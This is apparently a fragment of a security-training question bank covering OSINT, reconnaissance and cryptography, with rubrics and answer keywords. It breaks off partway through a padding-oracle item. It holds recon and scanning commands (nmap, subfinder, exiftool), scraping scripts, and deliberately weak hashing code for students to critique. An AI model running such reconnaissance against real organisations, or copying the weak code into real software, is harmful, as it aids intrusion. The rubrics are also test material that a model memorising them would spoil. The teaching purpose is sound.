  rubric: {
    maxScore: 7,
    criteria: [
      { id: "data-classification", description: "Correctly classifies each finding by severity (backup file as critical, salary as high, etc.)", points: 2, keywords: ["critical", "high", "sensitive", "confidential", "severity"], check: "Student appropriately classifies the severity of each exposure" },
      { id: "sql-backup", description: "Identifies the SQL backup as the most critical — may contain credentials, schema, data", points: 2, keywords: ["SQL backup", "credentials", "database", "passwords", "schema", "dump"], check: "Student identifies the SQL backup as the highest-risk finding" },
      { id: "admin-panel", description: "Notes exposed admin panel enables brute force or default credential attacks", points: 2, keywords: ["admin panel", "brute force", "default credentials", "login", "authentication"], check: "Student explains the risk of an exposed admin panel" },
      { id: "prevention", description: "Suggests robots.txt, access controls, removing indexed files, Google Search Console removal", points: 1, keywords: ["robots.txt", "noindex", "access control", "Search Console", "remove", "disallow"], check: "Student suggests appropriate mitigations" },
    ],
    gaps: [
      { if_missing: "sql-backup", gap: "Underestimates database backup exposure — study how backup files lead to full compromise" },
      { if_missing: "data-classification", gap: "Cannot prioritize findings by severity — practice triage of reconnaissance results" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "metadata-extraction",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `You download several documents from a target company's public website and extract metadata:\n\n\`\`\`bash\nexiftool -a -u *.pdf *.docx *.xlsx\n\`\`\`\n\nResults show:\n\`\`\`\nAuthor: jsmith@internal.corp.local\nCreator: Microsoft Word 2016\nProducer: Adobe Acrobat 9.0\nGPS Latitude: 48.8566\nGPS Longitude: 2.3522\nDirectory: \\\\fileserver01\\shared\\finance\\\nLast Modified By: admin-backup\n\`\`\`\n\nWhat information has been leaked? Map each metadata field to what an attacker learns and how they could use it in the next phase of an engagement.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "internal-domain", description: "Identifies internal domain name (corp.local) and username format (jsmith)", points: 2, keywords: ["internal domain", "corp.local", "username", "jsmith", "naming convention"], check: "Student extracts the internal domain and username pattern" },
      { id: "network-share", description: "Notes UNC path reveals internal server name and share structure", points: 2, keywords: ["UNC path", "fileserver01", "share", "network", "internal infrastructure"], check: "Student identifies the internal file server and directory structure" },
      { id: "software-versions", description: "Notes outdated software versions (Acrobat 9.0) may indicate unpatched systems", points: 2, keywords: ["Acrobat 9.0", "outdated", "version", "CVE", "unpatched", "vulnerable"], check: "Student flags software version information as vulnerability intel" },
      { id: "geolocation", description: "Identifies GPS coordinates as physical office location (Paris)", points: 2, keywords: ["GPS", "geolocation", "Paris", "physical location", "coordinates", "48.85"], check: "Student recognizes GPS data as physical location disclosure" },
    ],
    gaps: [
      { if_missing: "internal-domain", gap: "Does not recognize internal naming in metadata — practice metadata extraction for domain intel" },
      { if_missing: "network-share", gap: "Misses infrastructure info in UNC paths — study how document metadata leaks internal topology" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "port-scanning",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `You run the following nmap scan and get these results:\n\n\`\`\`bash\nnmap -sS -sV -O -p- --min-rate=1000 10.10.10.50\n\`\`\`\n\n\`\`\`\nPORT      STATE    SERVICE     VERSION\n22/tcp    open     ssh         OpenSSH 7.9p1\n80/tcp    open     http        Apache 2.4.38\n443/tcp   open     ssl/http    Apache 2.4.38\n3306/tcp  filtered mysql\n8080/tcp  open     http-proxy  Squid 4.6\n8443/tcp  open     https-alt   Apache Tomcat 9.0.30\n\`\`\`\n\nExplain what each nmap flag does. What does "filtered" mean for port 3306 versus "closed" or "open"? Based on these results, outline your next enumeration steps for each open service, prioritizing by likelihood of exploitation.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "flags-explained", description: "Correctly explains -sS (SYN scan), -sV (version detect), -O (OS detect), -p- (all ports)", points: 2, keywords: ["SYN scan", "half-open", "version detection", "OS fingerprint", "all ports", "65535"], check: "Student correctly explains each nmap flag" },
      { id: "filtered-state", description: "Explains filtered means a firewall is dropping packets (no RST, no SYN-ACK)", points: 2, keywords: ["filtered", "firewall", "dropped", "no response", "no RST", "stateful"], check: "Student correctly differentiates filtered from closed (RST) and open (SYN-ACK)" },
      { id: "enumeration-plan", description: "Outlines specific next steps: directory brute force, version CVE lookup, Squid proxy abuse, Tomcat manager", points: 2, keywords: ["gobuster", "nikto", "CVE", "Tomcat manager", "Squid", "proxy", "directory"], check: "Student provides concrete enumeration steps per service" },
      { id: "prioritization", description: "Prioritizes Tomcat and Squid as highest value targets with reasoning", points: 2, keywords: ["prioritize", "Tomcat", "manager", "Squid", "proxy", "misconfiguration", "highest risk"], check: "Student correctly prioritizes services by exploitation likelihood" },
    ],
    gaps: [
      { if_missing: "filtered-state", gap: "Confused about port states — review TCP handshake and how firewalls affect scan results" },
      { if_missing: "enumeration-plan", gap: "Lacks systematic enumeration methodology — study service-specific enumeration techniques" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "certificate-transparency",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `During a recon engagement, you discover that a company has issued a wildcard certificate \`*.internal.target.com\` that appears in Certificate Transparency logs. You also find a certificate for \`vpn.target.com\` with a Subject Alternative Name (SAN) list containing:\n\n\`\`\`\nDNS:vpn.target.com\nDNS:remote-access.target.com\nDNS:citrix.target.com\nDNS:sslvpn.target.com\nIP:203.0.113.50\n\`\`\`\n\nTrace how Certificate Transparency works from issuance to log. Explain what intelligence you can extract from both findings, and how an attacker would use this to map the target's infrastructure.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ct-mechanism", description: "Explains CT requires CAs to log certificates publicly for accountability", points: 2, keywords: ["CA", "log", "public", "accountability", "SCT", "pre-certificate", "append-only"], check: "Student explains the CT logging mechanism and its purpose" },
      { id: "wildcard-risk", description: "Notes wildcard cert in CT reveals the existence of internal subdomains", points: 2, keywords: ["wildcard", "internal", "subdomain", "infrastructure", "internal.target.com"], check: "Student identifies the wildcard cert as revealing internal subdomain namespace" },
      { id: "san-intel", description: "Extracts infrastructure intel: VPN vendor (Citrix), remote access patterns, IP addresses", points: 2, keywords: ["SAN", "Citrix", "VPN", "remote access", "IP address", "infrastructure"], check: "Student maps SAN entries to infrastructure intelligence" },
      { id: "attack-surface", description: "Describes how to use findings to probe for access points, phishing targets, or misconfigs", points: 2, keywords: ["attack surface", "probe", "phishing", "VPN attack", "default creds", "vulnerability"], check: "Student connects recon findings to actionable attack vectors" },
    ],
    gaps: [
      { if_missing: "ct-mechanism", gap: "Does not understand Certificate Transparency infrastructure — study CT logs and monitoring" },
      { if_missing: "san-intel", gap: "Misses intelligence in SAN fields — practice analyzing certificate details for recon" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "shodan-censys",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `You query Shodan for a target organization's IP range and find these results:\n\n\`\`\`\n203.0.113.10 - port 9200 - Elasticsearch 7.6.1\n203.0.113.15 - port 27017 - MongoDB 4.2.3 (no auth)\n203.0.113.20 - port 6379 - Redis 5.0.7\n203.0.113.25 - port 2375 - Docker API\n203.0.113.30 - port 11211 - Memcached\n\`\`\`\n\nFor each exposed service: What is the default security posture? What data or access can an attacker obtain without any credentials? What is the single most dangerous finding in this list and why?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "no-auth-services", description: "Identifies MongoDB, Redis, Elasticsearch, and Memcached as defaulting to no authentication", points: 2, keywords: ["no authentication", "default", "unauthenticated", "open", "no password"], check: "Student identifies which services lack default authentication" },
      { id: "docker-api", description: "Flags Docker API as the most critical — allows container creation with host mount for full RCE", points: 2, keywords: ["Docker", "2375", "container", "host mount", "RCE", "root", "most dangerous"], check: "Student identifies exposed Docker API as the highest-severity finding" },
      { id: "data-access", description: "Describes what data each service exposes (documents, cache, indices)", points: 2, keywords: ["indices", "documents", "keys", "cache", "data dump", "enumerate"], check: "Student explains what data is accessible from each service" },
      { id: "attack-chain", description: "Outlines how findings could chain together (e.g., Redis RCE to pivot internally)", points: 2, keywords: ["chain", "pivot", "internal", "Redis RCE", "SSRF", "lateral"], check: "Student shows how individual findings combine into attack chains" },
    ],
    gaps: [
      { if_missing: "docker-api", gap: "Does not understand Docker API exposure risk — study Docker socket and API security" },
      { if_missing: "no-auth-services", gap: "Unfamiliar with default service security postures — review common database and cache defaults" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "email-harvesting",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A recon script is supposed to harvest email addresses from multiple sources, but it misses results and has a bug:\n\n\`\`\`python\nimport re, requests\n\ndef harvest_emails(domain):\n    emails = []\n    \n    # Source 1: Google search\n    r = requests.get(f"https://www.google.com/search?q=%40{domain}&num=100")\n    pattern = r'[a-zA-Z0-9._%+-]+@' + domain\n    emails += re.findall(pattern, r.text)\n    \n    # Source 2: Hunter.io API\n    r = requests.get(f"https://api.hunter.io/v2/domain-search?domain={domain}")\n    for entry in r.json()['data']['emails']:\n        emails.append(entry['value'])\n    \n    return list(set(emails))\n\`\`\`\n\nIdentify the bugs and missing error handling. Fix the code and add at least two more email harvesting sources. Explain why the Google scraping approach is unreliable.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "google-captcha", description: "Identifies Google will block/CAPTCHA automated requests, returns different HTML", points: 2, keywords: ["CAPTCHA", "blocked", "rate limit", "403", "bot detection", "User-Agent"], check: "Student explains why scraping Google directly fails" },
      { id: "hunter-api-key", description: "Notes Hunter.io requires an API key which is missing in the request", points: 2, keywords: ["API key", "missing", "authentication", "hunter", "api_key parameter"], check: "Student identifies the missing API key parameter" },
      { id: "regex-fix", description: "Notes the regex needs escaping of the domain dots and proper anchoring", points: 2, keywords: ["escape", "re.escape", "dot", "anchoring", "\\\\.", "regex"], check: "Student fixes the regex to properly escape the domain" },
      { id: "additional-sources", description: "Adds sources like theHarvester, Phonebook.cz, LinkedIn, GitHub, PGP servers", points: 2, keywords: ["theHarvester", "Phonebook", "LinkedIn", "GitHub", "PGP", "Breach", "OSINT"], check: "Student adds at least two additional email sources" },
    ],
    gaps: [
      { if_missing: "google-captcha", gap: "Does not understand web scraping limitations — study anti-bot measures and API alternatives" },
      { if_missing: "regex-fix", gap: "Weak regex skills — practice regex pattern construction for data extraction" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "osint-workflow",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A junior analyst wrote this OSINT automation script, but it leaks the analyst's identity to the target:\n\n\`\`\`python\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef recon_target(target_url):\n    session = requests.Session()\n    \n    # Check main site\n    r = session.get(target_url)\n    soup = BeautifulSoup(r.text, 'html.parser')\n    \n    # Check robots.txt\n    r = session.get(f"{target_url}/robots.txt")\n    \n    # Check LinkedIn for employees\n    r = session.get(f"https://linkedin.com/company/{target_url.split('//')[1].split('.')[0]}")\n    \n    # Check Wayback Machine\n    r = session.get(f"https://web.archive.org/web/{target_url}/*")\n    \n    # Download interesting files\n    for link in soup.find_all('a', href=True):\n        if link['href'].endswith(('.pdf', '.doc', '.xls')):\n            session.get(link['href'])\n\`\`\`\n\nIdentify all the OPSEC failures. Fix the script to be operationally safe for a passive recon engagement.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "user-agent", description: "No User-Agent set — default python-requests header reveals the tool", points: 2, keywords: ["User-Agent", "python-requests", "header", "fingerprint", "default"], check: "Student identifies the default User-Agent as an OPSEC leak" },
      { id: "direct-access", description: "Directly accessing the target and LinkedIn crosses into active recon, not passive", points: 2, keywords: ["active", "passive", "direct connection", "IP address", "server logs", "LinkedIn"], check: "Student identifies direct target access as violating passive recon constraints" },
      { id: "proxy-tor", description: "Suggests using a proxy, VPN, or Tor to avoid revealing the analyst's IP", points: 2, keywords: ["proxy", "Tor", "VPN", "anonymize", "IP", "SOCKS"], check: "Student proposes network-level anonymization" },
      { id: "passive-alternatives", description: "Suggests using cached/archived versions and third-party APIs instead of direct access", points: 2, keywords: ["cache", "Wayback", "Google cache", "API", "third-party", "indirect"], check: "Student proposes passive alternatives to direct access" },
    ],
    gaps: [
      { if_missing: "user-agent", gap: "Missing OPSEC awareness for HTTP tooling — study request fingerprinting and header sanitization" },
      { if_missing: "direct-access", gap: "Cannot distinguish active from passive recon — review the passive/active recon boundary" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "attack-surface-mapping",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A penetration tester wrote this attack surface mapping script but it produces too many false positives and misses key checks:\n\n\`\`\`bash\n#!/bin/bash\nTARGET=$1\n\n# Subdomain enumeration\nsubfinder -d $TARGET -o subs.txt\n\n# Resolve and probe\nwhile read sub; do\n  ip=$(dig +short $sub)\n  if [ ! -z "$ip" ]; then\n    echo "$sub -> $ip" >> resolved.txt\n    # Check if alive\n    curl -s -o /dev/null -w "%{http_code}" http://$sub >> alive.txt\n  fi\ndone < subs.txt\n\n# Port scan everything\nnmap -p- $(cat resolved.txt | awk '{print $3}' | sort -u) -oN ports.txt\n\`\`\`\n\nIdentify the bugs, inefficiencies, and missing steps. Fix the script to produce a clean, deduplicated attack surface map with proper CDN/WAF detection.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "cdn-detection", description: "Notes the script does not filter CDN/cloud IPs — many 'alive' hosts may be behind Cloudflare/Akamai", points: 2, keywords: ["CDN", "Cloudflare", "Akamai", "WAF", "shared IP", "filter", "false positive"], check: "Student identifies missing CDN/WAF detection as source of false positives" },
      { id: "https-missing", description: "Script only checks HTTP, missing HTTPS endpoints", points: 2, keywords: ["HTTPS", "443", "TLS", "SSL", "both protocols", "httpx"], check: "Student notes the script misses HTTPS" },
      { id: "variable-quoting", description: "Identifies unquoted variables and missing error handling in the bash script", points: 2, keywords: ["quoting", "\"$sub\"", "\"$TARGET\"", "error handling", "exit code"], check: "Student fixes bash quoting and error handling issues" },
      { id: "tooling-improvement", description: "Suggests httpx/httprobe for alive checking, proper deduplication, and output formatting", points: 2, keywords: ["httpx", "httprobe", "dedup", "sort -u", "output format", "JSON"], check: "Student suggests better tooling for the workflow" },
    ],
    gaps: [
      { if_missing: "cdn-detection", gap: "Unaware of CDN/WAF implications for recon — study how to identify and handle CDN-fronted targets" },
      { if_missing: "variable-quoting", gap: "Weak bash scripting fundamentals — review shell quoting, word splitting, and error handling" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "social-engineering-recon",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You are conducting an authorized red team engagement against a financial services company. Before launching any social engineering attacks, you need to build a comprehensive target profile using only open-source intelligence.\n\nDesign a complete OSINT workflow to gather:\n1. Employee names, roles, and email format\n2. Technology stack and vendors\n3. Physical office locations and entry points\n4. Business relationships and third-party providers\n\nFor each category, specify the exact sources, tools, and techniques. Explain how you would validate findings without alerting the target.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "employee-intel", description: "Describes LinkedIn, GitHub, conference talks, job postings for employee profiling", points: 2, keywords: ["LinkedIn", "GitHub", "job postings", "conference", "social media", "org chart"], check: "Student outlines multi-source employee intelligence gathering" },
      { id: "tech-stack", description: "Uses Wappalyzer, BuiltWith, job postings, GitHub, and DNS for tech stack identification", points: 2, keywords: ["Wappalyzer", "BuiltWith", "job posting", "technology", "stack", "DNS"], check: "Student describes technology fingerprinting from multiple angles" },
      { id: "physical-recon", description: "Uses Google Maps, Street View, social media geotagging, building records", points: 2, keywords: ["Google Maps", "Street View", "geolocation", "physical", "entry point", "badge"], check: "Student covers physical location intelligence gathering" },
      { id: "validation", description: "Describes cross-referencing sources and using passive methods to validate without tipping off target", points: 3, keywords: ["cross-reference", "validate", "passive", "confirm", "multiple sources", "no alert"], check: "Student explains validation methodology that maintains operational security" },
    ],
    gaps: [
      { if_missing: "tech-stack", gap: "Limited technology fingerprinting skills — practice passive tech stack identification" },
      { if_missing: "validation", gap: "Missing validation methodology — study how to cross-reference OSINT without active probing" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "external-footprint",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `A company acquires a smaller firm and asks you to assess the combined external attack surface before integration. You have only the two company names and their primary domains.\n\nDesign a comprehensive external footprint mapping methodology that:\n1. Discovers all related domains, subdomains, and IP ranges for both entities\n2. Identifies shadow IT and forgotten infrastructure\n3. Maps cloud resources (S3 buckets, Azure blobs, GCP storage)\n4. Produces a risk-ranked inventory\n\nInclude specific automation strategies and explain how you would handle the scale of scanning thousands of potential assets.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "domain-discovery", description: "Describes reverse WHOIS, acquisitions research, ASN enumeration, and related domain discovery", points: 2, keywords: ["reverse WHOIS", "ASN", "acquisition", "related domains", "ARIN", "BGP"], check: "Student covers comprehensive domain and IP discovery methods" },
      { id: "shadow-it", description: "Addresses shadow IT via CT logs, expired domains, old DNS records, Wayback Machine", points: 2, keywords: ["shadow IT", "expired", "historical", "Wayback", "CT logs", "forgotten", "legacy"], check: "Student specifically addresses discovering forgotten/shadow infrastructure" },
      { id: "cloud-enum", description: "Includes cloud resource enumeration: S3 bucket naming patterns, Azure subdomain enum, GCP discovery", points: 2, keywords: ["S3", "bucket", "Azure", "blob", "GCP", "cloud enum", "storage", "naming pattern"], check: "Student covers cloud resource discovery across major providers" },
      { id: "risk-ranking", description: "Proposes a risk-ranking methodology based on exposure, patch status, and data sensitivity", points: 2, keywords: ["risk ranking", "severity", "exposure", "CVSS", "prioritize", "critical", "scoring"], check: "Student describes a systematic risk-ranking approach" },
      { id: "scale-automation", description: "Addresses scanning at scale: parallelization, rate limiting, notification, and result deduplication", points: 2, keywords: ["scale", "parallel", "rate limit", "automation", "pipeline", "queue", "dedup"], check: "Student addresses practical challenges of large-scale enumeration" },
    ],
    gaps: [
      { if_missing: "cloud-enum", gap: "Missing cloud enumeration skills — study cloud resource discovery and naming conventions" },
      { if_missing: "shadow-it", gap: "Does not address shadow IT discovery — learn historical infrastructure analysis techniques" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "passive-vs-active",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare passive and active reconnaissance in the context of a red team engagement against a well-defended target with:\n- A SOC monitoring for suspicious scanning activity\n- Web Application Firewall logging all requests\n- Threat intelligence feeds monitoring for domain/IP reputation queries\n\nFor each technique below, classify it as passive or active, explain what traces it leaves, and evaluate whether it would trigger detection:\n\n1. Querying Shodan for the target's IP range\n2. Running subfinder against the target domain\n3. Browsing the target's public website from a VPN\n4. Running nmap -sS against a single IP\n5. Querying crt.sh for certificates\n6. Sending a LinkedIn connection request to an employee`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "correct-classification", description: "Correctly classifies each technique as passive or active", points: 2, keywords: ["passive", "active", "classification", "direct interaction", "third-party"], check: "Student accurately classifies all six techniques" },
      { id: "traces-analysis", description: "Describes specific traces each technique leaves (server logs, API logs, connection requests)", points: 2, keywords: ["server logs", "API", "connection request", "fingerprint", "trace", "evidence"], check: "Student describes the forensic footprint of each technique" },
      { id: "gray-areas", description: "Identifies gray areas: Shodan queries may be logged by TI feeds, website browsing is technically active", points: 3, keywords: ["gray area", "borderline", "TI feed", "technically active", "debatable", "nuanced"], check: "Student identifies and discusses ambiguous classifications" },
      { id: "detection-assessment", description: "Evaluates detection likelihood per technique against the described defenses", points: 2, keywords: ["detection", "SOC", "alert", "threshold", "trigger", "unlikely", "likely"], check: "Student assesses detection probability against the stated defenses" },
    ],
    gaps: [
      { if_missing: "gray-areas", gap: "Treats passive/active as binary — study the spectrum of reconnaissance interaction and its detection implications" },
      { if_missing: "detection-assessment", gap: "Cannot assess detection risk — practice threat modeling from the defender's perspective" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "osint-tools",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare these OSINT frameworks and tools for a corporate reconnaissance engagement:\n\n1. Maltego (with Transforms)\n2. SpiderFoot\n3. Recon-ng\n4. theHarvester\n5. Amass\n\nFor each: What is its primary strength? What data sources does it uniquely access? When would you choose it over the others? Compare their automation capabilities, output formats, and how they handle API key management for paid data sources. Which combination of two tools would give you the best coverage?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "tool-strengths", description: "Correctly identifies the primary strength of each tool", points: 2, keywords: ["Maltego", "graph", "SpiderFoot", "automated", "Recon-ng", "modular", "theHarvester", "email", "Amass", "DNS"], check: "Student accurately describes each tool's primary strength" },
      { id: "data-sources", description: "Identifies unique data sources or APIs each tool accesses", points: 2, keywords: ["transforms", "modules", "API", "OSINT sources", "integration", "paid", "free"], check: "Student maps tools to their unique data source access" },
      { id: "api-management", description: "Discusses how each tool handles API keys and paid vs. free source limitations", points: 2, keywords: ["API key", "paid", "free tier", "rate limit", "configuration", "workspace"], check: "Student addresses API key management and cost considerations" },
      { id: "recommendation", description: "Recommends a specific two-tool combination with sound reasoning", points: 2, keywords: ["combination", "complement", "coverage", "recommend", "pair", "together"], check: "Student gives a justified recommendation for tool pairing" },
    ],
    gaps: [
      { if_missing: "tool-strengths", gap: "Limited OSINT tooling experience — hands-on practice with each framework needed" },
      { if_missing: "recommendation", gap: "Cannot synthesize tool capabilities into workflow — practice building OSINT pipelines" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "whois-analysis",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You are mapping the external infrastructure of a target organization. Starting only with their primary domain name, design a systematic WHOIS-based investigation that uncovers related domains, IP ranges, and organizational relationships.\n\nYour approach should:\n1. Extract registrant details, name servers, and registrar information from WHOIS\n2. Use reverse WHOIS to find other domains registered by the same entity\n3. Identify the organization's ASN and IP allocations from RIR databases (ARIN, RIPE, etc.)\n4. Cross-reference findings with BGP routing data\n\nExplain what each data source reveals, how WHOIS privacy/redaction (GDPR) affects your investigation, and how you would validate that discovered assets actually belong to the target.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "whois-fields", description: "Identifies key WHOIS fields: registrant org, admin/tech contacts, name servers, creation/expiry dates", points: 2, keywords: ["registrant", "admin contact", "name server", "creation date", "expiry", "WHOIS"], check: "Student identifies the relevant WHOIS fields for investigation" },
      { id: "reverse-whois", description: "Describes reverse WHOIS by org name, email, or name server to find related domains", points: 2, keywords: ["reverse WHOIS", "org name", "email", "related domains", "DomainTools", "ViewDNS"], check: "Student uses reverse WHOIS to discover related infrastructure" },
      { id: "asn-ip-ranges", description: "Queries RIR databases and BGP data to find the organization's IP allocations and ASN", points: 3, keywords: ["ASN", "RIR", "ARIN", "RIPE", "BGP", "IP range", "allocation", "netblock"], check: "Student maps IP allocations through RIR and BGP data" },
      { id: "gdpr-impact", description: "Explains GDPR-driven WHOIS redaction and alternative approaches when registrant data is hidden", points: 2, keywords: ["GDPR", "redacted", "privacy", "hidden", "alternative", "historical WHOIS"], check: "Student addresses WHOIS privacy limitations and workarounds" },
    ],
    gaps: [
      { if_missing: "asn-ip-ranges", gap: "Missing network infrastructure mapping skills — study ASN lookups and RIR database queries" },
      { if_missing: "gdpr-impact", gap: "Does not account for WHOIS privacy — learn post-GDPR OSINT techniques" },
    ],
  },
},

// --- crypto (Cryptography & cryptanalysis) ---

{
  competencyId: "crypto",
  subTopic: "xor-cipher",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `A message is encrypted using repeating-key XOR with the key \`KEY\` (ASCII: 0x4B, 0x45, 0x59).\n\nThe plaintext is: \`HELLO\` (ASCII: 0x48, 0x45, 0x4C, 0x4C, 0x4F)\n\nCompute the ciphertext byte by byte. Then explain: if you XOR the ciphertext with the same key again, what do you get? Why does this property make XOR both useful and dangerous as a cipher primitive?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "xor-computation", description: "Correctly computes each ciphertext byte (0x03, 0x00, 0x15, 0x07, 0x00)", points: 2, keywords: ["0x03", "0x00", "0x15", "0x07", "XOR"], check: "Student correctly XORs each byte pair" },
      { id: "involution", description: "Explains XOR is its own inverse — applying it twice recovers the original", points: 2, keywords: ["inverse", "self-inverse", "involution", "symmetric", "recovers", "decrypt"], check: "Student explains the involution property of XOR" },
      { id: "weakness", description: "Explains repeating-key XOR is vulnerable to frequency analysis, known-plaintext, and key-length detection", points: 2, keywords: ["frequency analysis", "known plaintext", "Kasiski", "key length", "repeating", "weak"], check: "Student identifies why repeating-key XOR is cryptographically weak" },
    ],
    gaps: [
      { if_missing: "xor-computation", gap: "Cannot perform basic XOR operations — practice bitwise arithmetic" },
      { if_missing: "weakness", gap: "Does not understand XOR cipher weaknesses — study classical cipher attacks" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "aes-modes",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `Consider AES-128 in ECB mode encrypting a 48-byte plaintext consisting of three identical 16-byte blocks:\n\n\`\`\`\nBlock 1: AAAAAAAAAAAAAAAA (16 bytes of 0x41)\nBlock 2: AAAAAAAAAAAAAAAA (16 bytes of 0x41)\nBlock 3: AAAAAAAAAAAAAAAA (16 bytes of 0x41)\n\`\`\`\n\nWhat will be true about the three ciphertext blocks? Now consider the same plaintext encrypted with AES-128-CBC using a random IV. What changes? Why is this property of ECB mode a critical vulnerability, and give a real-world example of its exploitation?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "ecb-identical", description: "States all three ECB ciphertext blocks will be identical", points: 2, keywords: ["identical", "same", "deterministic", "repeated", "pattern"], check: "Student correctly identifies ECB produces identical ciphertext for identical plaintext blocks" },
      { id: "cbc-different", description: "Explains CBC produces different ciphertext blocks due to IV and chaining", points: 2, keywords: ["CBC", "different", "IV", "chaining", "XOR previous", "initialization vector"], check: "Student explains CBC prevents pattern leakage through chaining" },
      { id: "ecb-penguin", description: "Provides a real-world example like the ECB penguin (encrypted bitmap) or Adobe breach", points: 2, keywords: ["penguin", "bitmap", "image", "pattern", "Adobe", "visual", "leaks structure"], check: "Student gives a concrete example of ECB pattern leakage" },
      { id: "pattern-leak", description: "Explains ECB leaks plaintext structure, enabling pattern analysis", points: 1, keywords: ["structure", "pattern", "leaks", "block boundary", "analysis"], check: "Student articulates why pattern preservation is dangerous" },
    ],
    gaps: [
      { if_missing: "ecb-identical", gap: "Does not understand ECB mode determinism — review block cipher modes of operation" },
      { if_missing: "cbc-different", gap: "Missing CBC understanding — study how CBC's chaining prevents pattern leakage" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "hash-collisions",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `A web application verifies file integrity using this approach:\n\n\`\`\`python\nimport hashlib\n\ndef verify_upload(file_data, expected_hash):\n    computed = hashlib.md5(file_data).hexdigest()\n    if computed == expected_hash:\n        return True\n    return False\n\ndef check_password(password, stored_hash):\n    return hashlib.sha1(password.encode()).hexdigest() == stored_hash\n\`\`\`\n\nIdentify the cryptographic vulnerabilities in both functions. Explain what attacks each is vulnerable to, and provide the secure alternatives with reasoning.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "md5-collision", description: "Identifies MD5 as vulnerable to collision attacks (chosen-prefix collisions demonstrated)", points: 2, keywords: ["MD5", "collision", "chosen-prefix", "broken", "forgery"], check: "Student flags MD5 as vulnerable to practical collision attacks" },
      { id: "sha1-preimage", description: "Identifies SHA-1 as deprecated for security use, with demonstrated collisions (SHAttered)", points: 2, keywords: ["SHA-1", "SHAttered", "collision", "deprecated", "Google"], check: "Student identifies SHA-1 as practically broken for collision resistance" },
      { id: "password-nosalt", description: "Notes password hashing uses no salt and no key stretching, enabling rainbow tables", points: 2, keywords: ["no salt", "rainbow table", "key stretching", "fast hash", "precomputed"], check: "Student identifies the missing salt and key stretching in password hashing" },
      { id: "secure-alternatives", description: "Recommends SHA-256/SHA-3 for integrity and bcrypt/argon2 for passwords", points: 2, keywords: ["SHA-256", "SHA-3", "bcrypt", "Argon2", "scrypt", "PBKDF2", "key derivation"], check: "Student recommends appropriate modern alternatives" },
    ],
    gaps: [
      { if_missing: "md5-collision", gap: "Unaware of MD5 collision attacks — study hash function security levels and practical breaks" },
      { if_missing: "password-nosalt", gap: "Does not understand password hashing requirements — review salt, pepper, and key derivation functions" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "rsa-small-exponent",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `A CTF challenge presents the following RSA parameters:\n\n\`\`\`python\nn = 0x00b3510a2f7b2954e80d4c...  # 2048-bit modulus\ne = 3\nc = 0x00000000000000000000...01a2b3  # ciphertext (very small)\n\`\`\`\n\nThe ciphertext \`c\` is numerically very small — much smaller than \`n\`. The public exponent is 3. What vulnerability does this indicate? How would you recover the plaintext? Under what additional conditions would this attack fail, and what is the standard mitigation?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "cube-root", description: "Identifies that with e=3 and small plaintext, c = m^3 might not wrap around n, so m = cube_root(c)", points: 3, keywords: ["cube root", "small", "no modular reduction", "m^3 < n", "integer root"], check: "Student recognizes the small-message/small-exponent attack" },
      { id: "padding-defense", description: "Explains OAEP/PKCS#1 v2 padding prevents this by making the padded message large", points: 2, keywords: ["OAEP", "padding", "PKCS", "randomized", "full-domain"], check: "Student identifies proper padding as the mitigation" },
      { id: "hastad", description: "Mentions Hastad's broadcast attack if same message encrypted to multiple recipients with e=3", points: 2, keywords: ["Hastad", "broadcast", "CRT", "multiple recipients", "Chinese Remainder"], check: "Student knows the multi-recipient variant of the attack" },
    ],
    gaps: [
      { if_missing: "cube-root", gap: "Does not understand low-exponent RSA attacks — study RSA small-exponent vulnerabilities" },
      { if_missing: "padding-defense", gap: "Missing knowledge of RSA padding — review OAEP and textbook vs. padded RSA" },
    ],
  },
},

{
  competencyId: "crypto",
  subTopic: "padding-oracle",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
